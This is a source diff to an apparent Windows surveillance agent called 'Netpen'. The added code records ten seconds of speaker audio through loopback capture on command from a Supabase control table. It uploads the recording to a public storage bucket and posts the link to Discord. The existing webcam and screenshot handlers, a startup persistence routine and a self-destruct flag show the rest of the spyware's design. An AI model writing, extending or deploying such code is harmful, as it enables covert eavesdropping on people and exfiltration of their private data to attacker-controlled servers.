@@ -1,11 +1,15 @@
 #include <windows.h>
+#define INITGUID
 #include <winhttp.h>
 #include <string>
 #include <vector>
+#include <cstdint>
 #include <ctime>
 #include <wincrypt.h>
 #include <gdiplus.h>
 #include <dshow.h>
+#include <mmdeviceapi.h>
+#include <audioclient.h>
 #include "config.h"
 
 // Missing DirectShow declarations (not available in this mingw version)
@@ -638,6 +642,73 @@ static bool CaptureWebcamFrame(const char* outputPath) {
     return result;
 }
 
+static bool CaptureSpeaker(const char* outputPath) {
+    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+    if (FAILED(hr)) return false;
+    bool result = false;
+    IMMDeviceEnumerator* pEnum = NULL;
+    IMMDevice* pDevice = NULL;
+    IAudioClient* pClient = NULL;
+    IAudioCaptureClient* pCapture = NULL;
+    do {
+        if (FAILED(CoCreateInstance(CLSID_MMDeviceEnumerator, NULL, CLSCTX_ALL, IID_IMMDeviceEnumerator, (void**)&pEnum))) break;
+        if (FAILED(pEnum->GetDefaultAudioEndpoint(eRender, eConsole, &pDevice))) break;
+        if (FAILED(pDevice->Activate(IID_IAudioClient, CLSCTX_ALL, NULL, (void**)&pClient))) break;
+        WAVEFORMATEX* pMixFormat = NULL;
+        if (FAILED(pClient->GetMixFormat(&pMixFormat))) break;
+        REFERENCE_TIME bufDuration = 10000000;
+        if (FAILED(pClient->Initialize(AUDCLNT_SHAREMODE_SHARED, AUDCLNT_STREAMFLAGS_LOOPBACK, bufDuration, 0, pMixFormat, NULL))) { CoTaskMemFree(pMixFormat); break; }
+        if (FAILED(pClient->GetService(IID_IAudioCaptureClient, (void**)&pCapture))) { CoTaskMemFree(pMixFormat); break; }
+        UINT32 bytesPerFrame = pMixFormat->nBlockAlign;
+        UINT32 estimatedBytes = pMixFormat->nSamplesPerSec * bytesPerFrame * 10;
+        std::vector<BYTE> audioBuffer;
+        audioBuffer.reserve(estimatedBytes + 44);
+        struct WAVHDR { char id[4]; uint32_t sz; char wave[4]; char fId[4]; uint32_t fsz; uint16_t tag; uint16_t ch; uint32_t sr; uint32_t br; uint16_t ba; uint16_t bps; char dId[4]; uint32_t dsz; } hdr;
+        memcpy(hdr.id, "RIFF", 4); memcpy(hdr.wave, "WAVE", 4); memcpy(hdr.fId, "fmt ", 4); memcpy(hdr.dId, "data", 4);
+        hdr.fsz = 16; hdr.tag = pMixFormat->wFormatTag; hdr.ch = pMixFormat->nChannels;
+        hdr.sr = pMixFormat->nSamplesPerSec; hdr.br = pMixFormat->nAvgBytesPerSec;
+        hdr.ba = pMixFormat->nBlockAlign; hdr.bps = pMixFormat->wBitsPerSample;
+        hdr.dsz = 0; hdr.sz = 0;
+        audioBuffer.insert(audioBuffer.end(), (BYTE*)&hdr, (BYTE*)&hdr + sizeof(hdr));
+        if (FAILED(pClient->Start())) { CoTaskMemFree(pMixFormat); break; }
+        DWORD startTime = GetTickCount();
+        while (GetTickCount() - startTime < 10000) {
+            UINT32 packets = 0;
+            while (SUCCEEDED(pCapture->GetNextPacketSize(&packets)) && packets > 0) {
+                BYTE* pData = NULL; UINT32 frames = 0; DWORD flags = 0;
+                if (FAILED(pCapture->GetBuffer(&pData, &frames, &flags, NULL, NULL))) break;
+                if (frames > 0 && !(flags & AUDCLNT_BUFFERFLAGS_SILENT))
+                    audioBuffer.insert(audioBuffer.end(), pData, pData + frames * bytesPerFrame);
+                else if (frames > 0)
+                    audioBuffer.insert(audioBuffer.end(), frames * bytesPerFrame, 0);
+                pCapture->ReleaseBuffer(frames);
+            }
+            if (packets == 0) Sleep(15);
+        }
+        pClient->Stop();
+        CoTaskMemFree(pMixFormat);
+        {
+            size_t totalData = audioBuffer.size() - sizeof(hdr);
+            WAVHDR* wh = (WAVHDR*)audioBuffer.data();
+            wh->sz = (uint32_t)(totalData + sizeof(hdr) - 8);
+            wh->dsz = (uint32_t)totalData;
+        }
+        HANDLE hFile = CreateFileA(outputPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile != INVALID_HANDLE_VALUE) {
+            DWORD written = 0;
+            WriteFile(hFile, audioBuffer.data(), (DWORD)audioBuffer.size(), &written, NULL);
+            CloseHandle(hFile);
+            result = written == audioBuffer.size();
+        }
+    } while (false);
+    if (pCapture) pCapture->Release();
+    if (pClient) pClient->Release();
+    if (pDevice) pDevice->Release();
+    if (pEnum) pEnum->Release();
+    CoUninitialize();
+    return result;
+}
+
 static std::string GetScreenshotTimestamp() {
     time_t now = time(NULL);
     struct tm* tm = gmtime(&now);
@@ -761,6 +832,48 @@ static void HandleWebcam(const std::string& rowId) {
 
     DeleteFileA(localFile.c_str());
     LogMsg("Webcam done: " + resultUrl);
+}
+
+static std::string CheckSpeakerCmd() {
+    std::wstring q = SUPABASE_CONTROL_PATH;
+    q += L"?command=eq.speaker&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id";
+    std::string resp;
+    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return "";
+    size_t p = resp.find("\"id\":");
+    if (p == std::string::npos) return "";
+    p += 5;
+    size_t e = resp.find_first_of("},]", p);
+    if (e == std::string::npos) return "";
+    return resp.substr(p, e - p);
+}
+
+static void HandleSpeaker(const std::string& rowId) {
+    char tmp[MAX_PATH];
+    GetTempPathA(MAX_PATH, tmp);
+    std::string ts = GetScreenshotTimestamp();
+    std::string localFile = std::string(tmp) + "NetpenAudio_" + g_hostname + "_" + ts + ".wav";
+    std::string storageFile = "speaker/" + g_hostname + "_" + ts + ".wav";
+
+    if (!CaptureSpeaker(localFile.c_str())) { LogMsg("Speaker: capture failed"); return; }
+    std::string storagePath = "/storage/v1/object/Netpen/" + storageFile;
+    if (!UploadToStorage(localFile, storagePath, "audio/wav")) {
+        LogMsg("Speaker: upload failed");
+        DeleteFileA(localFile.c_str());
+        return;
+    }
+
+    std::string resultUrl = "https://xdxlfkyywnjrzqblvdzg.supabase.co/storage/v1/object/public/Netpen/" + storageFile;
+    std::string json = "{\"executed\":true,\"result_url\":\"" + EscapeJSON(resultUrl) + "\"}";
+    std::wstring patchPath = SUPABASE_CONTROL_PATH;
+    patchPath += L"?id=eq." + ToWide(rowId);
+    std::string resp;
+    HttpRequest(L"PATCH", patchPath.c_str(), json, resp);
+
+    std::string host = g_hostname.empty() ? "unknown" : g_hostname;
+    PostDiscordImage(host, "Netpen \u2014 " + host + " Speaker Capture", resultUrl, "10s WAV audio capture. Download: " + resultUrl);
+
+    DeleteFileA(localFile.c_str());
+    LogMsg("Speaker done: " + resultUrl);
 }
 
 static void FetchTriggers() {
@@ -1048,6 +1161,8 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                 if (!scRowId.empty()) HandleScreenshot(scRowId);
                 std::string wcRowId = CheckWebcamCmd();
                 if (!wcRowId.empty()) HandleWebcam(wcRowId);
+                std::string spRowId = CheckSpeakerCmd();
+                if (!spRowId.empty()) HandleSpeaker(spRowId);
             }
             if (counter % 120 == 0 && !g_selfDestructing) {
                 EnsureStartupEntry();
